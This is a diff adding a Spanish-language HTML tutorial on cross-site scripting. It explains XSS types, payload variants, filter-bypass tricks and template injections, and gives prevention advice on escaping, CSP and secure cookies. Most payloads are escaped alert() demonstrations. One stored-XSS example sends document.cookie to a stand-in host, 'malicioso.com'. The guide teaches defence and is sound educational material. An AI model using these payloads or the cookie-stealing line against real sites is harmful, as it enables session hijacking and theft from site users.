@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guía Completa de XSS - Cross-Site Scripting</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        h2 {
+            color: #e74c3c;
+            border-left: 5px solid #e74c3c;
+            padding-left: 15px;
+            margin: 30px 0 20px 0;
+            font-size: 1.8em;
+        }
+        
+        h3 {
+            color: #3498db;
+            margin: 25px 0 15px 0;
+            font-size: 1.4em;
+        }
+        
+        h4 {
+            color: #27ae60;
+            margin: 20px 0 10px 0;
+            font-size: 1.2em;
+        }
+        
+        p {
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+        
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            overflow-x: auto;
+            border-left: 4px solid #3498db;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #f39c12;
+        }
+        
+        .danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #e74c3c;
+        }
+        
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #27ae60;
+        }
+        
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #3498db;
+        }
+        
+        ul, ol {
+            margin-left: 30px;
+            margin-bottom: 15px;
+        }
+        
+        li {
+            margin-bottom: 8px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        th {
+            background: #34495e;
+            color: white;
+            font-weight: bold;
+        }
+        
+        tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .payload-example {
+            background: #1a1a1a;
+            color: #ff6b6b;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            margin: 10px 0;
+            border: 1px solid #ff6b6b;
+        }
+        
+        .demo-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 2px dashed #6c757d;
+        }
+        
+        .highlight {
+            background: #fff3cd;
+            padding: 2px 4px;
+            border-radius: 3px;
+            color: #856404;
+        }
+        
+        .toc {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #dee2e6;
+        }
+        
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+        
+        .toc a {
+            text-decoration: none;
+            color: #3498db;
+            font-weight: 500;
+        }
+        
+        .toc a:hover {
+            text-decoration: underline;
+        }
+        
+        .section {
+            margin: 40px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ Guía Completa de XSS - Cross-Site Scripting</h1>
+        
+        <div class="toc">
+            <h3>📚 Índice de Contenidos</h3>
+            <ul>
+                <li><a href="#introduccion">1. Introducción al XSS</a></li>
+                <li><a href="#tipos-xss">2. Tipos de XSS</a></li>
+                <li><a href="#sabores-xss">3. "Sabores" de XSS</a></li>
+                <li><a href="#vectores-avanzados">4. Vectores de Ataque Avanzados</a></li>
+                <li><a href="#prevencion">5. Prevención y Mitigación</a></li>
+                <li><a href="#herramientas">6. Herramientas de Testing</a></li>
+                <li><a href="#ejemplos-practicos">7. Ejemplos Prácticos</a></li>
+                <li><a href="#buenas-practicas">8. Buenas Prácticas</a></li>
+            </ul>
+        </div>
+
+        <div class="section" id="introduccion">
+            <h2>🎯 1. Introducción al XSS</h2>
+            <p>Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad web que permite a un atacante inyectar scripts maliciosos en páginas web visualizadas por otros usuarios. Es una de las vulnerabilidades más comunes en aplicaciones web según OWASP Top 10.</p>
+            
+            <div class="danger">
+                <strong>⚠️ Impacto del XSS:</strong>
+                <ul>
+                    <li>Robo de cookies y sesiones</li>
+                    <li>Redireccionamiento a sitios maliciosos</li>
+                    <li>Desfiguración de páginas web</li>
+                    <li>Keylogging y captura de credenciales</li>
+                    <li>Ejecución de acciones en nombre del usuario</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section" id="tipos-xss">
+            <h2>🔍 2. Tipos de XSS</h2>
+            
+            <h3>2.1 Reflected XSS (No Persistente)</h3>
+            <p>El script malicioso se refleja inmediatamente en la respuesta del servidor sin almacenarse.</p>
+            <div class="code-block">
+                # Ejemplo: Parámetro de búsqueda vulnerable
+                http://ejemplo.com/buscar?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+            </div>
+            
+            <h3>2.2 Stored XSS (Persistente)</h3>
+            <p>El script malicioso se almacena en el servidor (base de datos, archivo, etc.) y se ejecuta cada vez que se accede a la página.</p>
+            <div class="code-block">
+                # Ejemplo: Comentario en blog con XSS
+                Comentario: "¡Excelente artículo! &lt;script&gt;document.location='http://malicioso.com/robar.php?cookie='+document.cookie&lt;/script&gt;"
+            </div>
+            
+            <h3>2.3 DOM-Based XSS</h3>
+            <p>La vulnerabilidad existe en el código JavaScript del lado del cliente, no en el servidor.</p>
+            <div class="code-block">
+                # Ejemplo: Manipulación del DOM
+                document.getElementById('saludo').innerHTML = "Hola " + nombre;
+                # Si nombre = "&lt;img src=x onerror=alert('XSS')&gt;"
+            </div>
+        </div>
+
+        <div class="section" id="sabores-xss">
+            <h2>🎨 3. "Sabores" de XSS</h2>
+            <p>Un ataque XSS no siempre necesita llevar explícitamente <code>&lt;script&gt;…&lt;/script&gt;</code>. De hecho hay muchísimos "sabores" de XSS que usan atributos y eventos HTML:</p>
+            
+            <h3>3.1 XSS con etiquetas &lt;script&gt;</h3>
+            <div class="payload-example">
+                &lt;script&gt;alert('XSS')&lt;/script&gt;
+            </div>
+            
+            <h3>3.2 XSS en atributos</h3>
+            <div class="payload-example">
+                &lt;img src=x onerror=alert('XSS')&gt;
+            </div>
+            
+            <h3>3.3 XSS en URLs javascript</h3>
+            <div class="payload-example">
+                &lt;a href="javascript:alert('XSS')"&gt;pichar&lt;/a&gt;
+            </div>
+            
+            <h3>3.4 Vectores Adicionales</h3>
+            <div class="payload-example">
+                # Evento onload
+                &lt;body onload=alert('XSS')&gt;
+                
+                # Evento onmouseover
+                &lt;div onmouseover="alert('XSS')"&gt;Pasa el ratón aquí&lt;/div&gt;
+                
+                # SVG con JavaScript
+                &lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;
+                
+                # Iframe con JavaScript
+                &lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
+            </div>
+        </div>
+
+        <div class="section" id="vectores-avanzados">
+            <h2>🚀 4. Vectores de Ataque Avanzados</h2>
+            
+            <h3>4.1 XSS con Encoding</h3>
+            <div class="code-block">
+                # HTML Entity Encoding
+                &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;
+                
+                # URL Encoding
+                %3Cscript%3Ealert('XSS')%3C/script%3E
+                
+                # JavaScript Unicode
+                \u003cscript\u003ealert('XSS')\u003c/script\u003e
+            </div>
+            
+            <h3>4.2 XSS en Contextos Específicos</h3>
+            
+            <h4>4.2.1 XSS en CSS</h4>
+            <div class="code-block">
+                # En atributo style
+                &lt;div style="background:url('javascript:alert(1)')"&gt;
+                
+                # En CSS externo
+                body { background: url('javascript:alert(1)'); }
+                
+                # CSS Expression (IE)
+                div { width: expression(alert('XSS')); }
+            </div>
+            
+            <h4>4.2.2 XSS en JSON</h4>
+            <div class="code-block">
+                # JSON sin escape adecuado
+                var datos = {"nombre": "&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;"};
+            </div>
+            
+            <h4>4.2.3 XSS en Plantillas</h4>
+            <div class="code-block">
+                # AngularJS
+                {{constructor.constructor('alert(1)')()}}
+                
+                # Handlebars
+                {{#with "s" as |string|}}{{#with "e"}}{{lookup string @index}}{{/with}}{{/with}}
+            </div>
+            
+            <h3>4.3 Bypass de Filtros</h3>
+            <div class="code-block">
+                # Mayúsculas y minúsculas
+                &lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+                
+                # Espacios y caracteres especiales
+                &lt;script     &gt;alert('XSS')&lt;/script&gt;
+                
+                # Comentarios HTML
+                &lt;!--&lt;script&gt;alert('XSS')&lt;/script&gt;--&gt;
+                
+                # Concatenación
+                '&lt;scr'+'ipt&gt;alert("XSS")&lt;/scr'+'ipt&gt;'
+            </div>
+        </div>
+
+        <div class="section" id="prevencion">
+            <h2>🛡️ 5. Prevención y Mitigación</h2>
+            
+            <h3>5.1 Escapar (encode) siempre la salida</h3>
+            <p>Nunca insertes datos de usuario "a pelo" en el HTML. Usa funciones de escape contextuales:</p>
+            
+            <h4>PHP</h4>
+            <div class="code-block">
+                echo htmlspecialchars($usuario, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+                
+                # Para JSON
+                echo json_encode($datos, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
+            </div>
+            
+            <h4>JavaScript</h4>
+            <div class="code-block">
+                # Función de escape básica
+                function escapeHtml(text) {
+                    const map = {
+                        '&': '&amp;',
+                        '<': '&lt;',
+                        '>': '&gt;',
+                        '"': '&quot;',
+                        "'": '&#039;'
+                    };
+                    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+                }
+            </div>
+            
+            <h4>Python</h4>
+            <div class="code-block">
+                import html
+                
+                # Escape básico
+                escaped = html.escape(user_input)
+                
+                # Con Jinja2
+                from markupsafe import escape
+                escaped = escape(user_input)
+            </div>
+            
+            <h3>5.2 Validar y sanear la entrada</h3>
+            <div class="success">
+                <strong>✅ Estrategia de Whitelist:</strong>
+                <ul>
+                    <li>Define exactamente qué caracteres son permitidos</li>
+                    <li>Rechaza todo lo que no esté en la lista blanca</li>
+                    <li>Usa expresiones regulares estrictas</li>
+                </ul>
+            </div>
+            
+            <div class="code-block">
+                # Ejemplo PHP: Solo letras y espacios para nombres
+                if (!preg_match('/^[a-zA-Z\s]+$/', $nombre)) {
+                    throw new Exception("Nombre inválido");
+                }
+                
+                # Ejemplo JavaScript: Validación de email
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    throw new Error("Email inválido");
+                }
+            </div>
+            
+            <h3>5.3 Content Security Policy (CSP)</h3>
+            <p>CSP es una capa adicional de seguridad que ayuda a detectar y mitigar XSS:</p>
+            
+            <div class="code-block">
+                # Cabecera HTTP básica
+                Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com; style-src 'self' 'unsafe-inline'
+                
+                # CSP más estricto
+                Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'
+                
+                # Reportar violaciones
+                Content-Security-Policy: default-src 'self'; report-uri /csp-report
+            </div>
+            
+            <h3>5.4 Configuración de Cookies Seguras</h3>
+            <div class="code-block">
+                # Configuración completa de cookies
+                Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
+                
+                # En PHP
+                setcookie("session", $value, [
+                    'expires' => time() + 3600,
+                    'path' => '/',
+                    'domain' => '.ejemplo.com',
+                    'secure' => true,
+                    'httponly' => true,
+                    'samesite' => 'Strict'
+                ]);
+            </div>
+            
+            <h3>5.5 Frameworks con Auto-escape</h3>
+            <div class="info">
+                <strong>🔧 Frameworks Recomendados:</strong>
+                <ul>
+                    <li><strong>React:</strong> Escape automático en JSX</li>
+                    <li><strong>Angular:</strong> Sanitización automática</li>
+                    <li><strong>Vue.js:</strong> Escape por defecto en templates</li>
+                    <li><strong>Laravel Blade:</strong> Escape automático con {{ }}</li>
+                    <li><strong>Django:</strong> Auto-escape en templates</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section" id="herramientas">
+            <h2>🔧 6. Herramientas de Testing</h2>
+            
+            <h3>6.1 Herramientas Automáticas</h3>
+            <table>
+                <tr>
+                    <th>Herramienta</th>
+                    <th>Tipo</th>
+                    <th>Descripción</th>
+                </tr>
+                <tr>
+                    <td>OWASP ZAP</td>
+                    <td>Gratuita</td>
+                    <td>Proxy interceptor con scanner XSS</td>
+                </tr>
+                <tr>
+                    <td>Burp Suite</td>
+                    <td>Comercial</td>
+                    <td>Plataforma completa de testing</td>
+                </tr>
+                <tr>
+                    <td>XSSer</td>
+                    <td>Gratuita</td>
+                    <td>Framework especializado en XSS</td>
+                </tr>
+                <tr>
+                    <td>Nuclei</td>
+                    <td>Gratuita</td>
+                    <td>Scanner con templates XSS</td>
+                </tr>
+            </table>
+            
+            <h3>6.2 Payloads de Testing</h3>
+            <div class="code-block">
+                # Payloads básicos
+                &lt;script&gt;alert(1)&lt;/script&gt;
+                '&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+                "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+                
+                # Payloads para bypass
+                &lt;img src=x onerror=alert(1)&gt;
+                &lt;svg onload=alert(1)&gt;
+                javascript:alert(1)
+                
+                # Payloads avanzados
+                &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;
+                &lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
+                &lt;object data="javascript:alert(1)"&gt;&lt;/object&gt;
+            </div>
+        </div>
+
+        <div class="section" id="ejemplos-practicos">
+            <h2>💡 7. Ejemplos Prácticos</h2>
+            
+            <h3>7.1 Ejemplo Vulnerable</h3>
+            <div class="code-block">
+                # PHP Vulnerable
+                &lt;?php
+                $nombre = $_GET['nombre'];
+                echo "Hola " . $nombre;
+                ?&gt;
+                
+                # URL de ataque
+                http://ejemplo.com/saludo.php?nombre=&lt;script&gt;alert('XSS')&lt;/script&gt;
+            </div>
+            
+            <h3>7.2 Ejemplo Corregido</h3>
+            <div class="code-block">
+                # PHP Seguro
+                &lt;?php
+                $nombre = $_GET['nombre'];
+                echo "Hola " . htmlspecialchars($nombre, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+                ?&gt;
+            </div>
+            
+            <h3>7.3 Probando en DVWA</h3>
+            <div class="warning">
+                <strong>🔍 Ejercicio Práctico:</strong>
+                <ol>
+                    <li>Configura DVWA en nivel <strong>Low</strong></li>
+                    <li>Prueba payloads básicos de XSS</li>
+                    <li>Cambia a nivel <strong>Medium</strong> y observa los filtros</li>
+                    <li>Intenta bypass con encoding y técnicas avanzadas</li>
+                    <li>Nivel <strong>High</strong>: Analiza las defensas implementadas</li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="section" id="buenas-practicas">
+            <h2>📋 8. Resumen de Buenas Prácticas</h2>
+            
+            <table>
+                <tr>
+                    <th>Medida</th>
+                    <th>Qué hace</th>
+                    <th>Ejemplo</th>
+                </tr>
+                <tr>
+                    <td>Output Encoding</td>
+                    <td>Transforma &lt; en &amp;lt;</td>
+                    <td>htmlspecialchars() en PHP</td>
+                </tr>
+                <tr>
+                    <td>Input Validation</td>
+                    <td>Solo acepta caracteres esperados</td>
+                    <td>Whitelist con regex</td>
+                </tr>
+                <tr>
+                    <td>CSP</td>
+                    <td>Restringe de dónde se cargan scripts</td>
+                    <td>Content-Security-Policy header</td>
+                </tr>
+                <tr>
+                    <td>HttpOnly Cookies</td>
+                    <td>Evita que scripts lean las cookies</td>
+                    <td>Set-Cookie: HttpOnly</td>
+                </tr>
+                <tr>
+                    <td>Frameworks seguros</td>
+                    <td>Auto-escape integrado</td>
+                    <td>React, Angular, Laravel</td>
+                </tr>
+            </table>
+            
+            <div class="success">
+                <h4>✅ Checklist de Seguridad XSS</h4>
+                <ul>
+                    <li>☐ Implementar output encoding contextual</li>
+                    <li>☐ Validar toda entrada de usuario</li>
+                    <li>☐ Configurar CSP restrictivo</li>
+                    <li>☐ Usar cookies HttpOnly y Secure</li>
+                    <li>☐ Implementar SameSite en cookies</li>
+                    <li>☐ Usar frameworks con auto-escape</li>
+                    <li>☐ Realizar testing regular de XSS</li>
+                    <li>☐ Capacitar al equipo de desarrollo</li>
+                    <li>☐ Implementar logging de intentos de XSS</li>
+                    <li>☐ Mantener dependencias actualizadas</li>
+                </ul>
+            </div>
+            
+            <div class="info">
+                <h4>📚 Recursos Adicionales</h4>
+                <ul>
+                    <li><strong>OWASP XSS Prevention Cheat Sheet</strong></li>
+                    <li><strong>PortSwigger Web Security Academy</strong></li>
+                    <li><strong>Mozilla Developer Network (MDN) - Security</strong></li>
+                    <li><strong>SANS Secure Coding Practices</strong></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="demo-section">
+            <h3>🎯 Próximos Pasos</h3>
+            <p>Para dominar completamente XSS, te recomiendo:</p>
+            <ol>
+                <li><strong>Práctica en laboratorios:</strong> DVWA, WebGoat, bWAPP</li>
+                <li><strong>Análisis de código:</strong> Revisa aplicaciones reales</li>
+                <li><strong>Bug bounty:</strong> Participa en programas de recompensas</li>
+                <li><strong>Desarrollo seguro:</strong> Implementa las defensas en tus proyectos</li>
+                <li><strong>Mantente actualizado:</strong> Sigue las últimas técnicas y defensas</li>
+            </ol>
+        </div>
+    </div>
+</body>
+</html>
